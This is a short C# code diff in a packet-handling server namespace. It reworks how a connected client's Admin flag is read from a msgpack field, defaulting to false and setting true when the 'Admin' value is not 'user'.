@@ -36,11 +36,8 @@ namespace Server.Handle_Packet
                     }
                     catch { }
                 }
-                if (unpack_msgpack.ForcePathObject("User").AsString.ToLower() =="user") 
-                {
-                    client.Admin = false;
-                } 
-                else
+                client.Admin = false;
+                if (unpack_msgpack.ForcePathObject("Admin").AsString.ToLower() !="user") 
                 {
                     client.Admin = true;
                 }
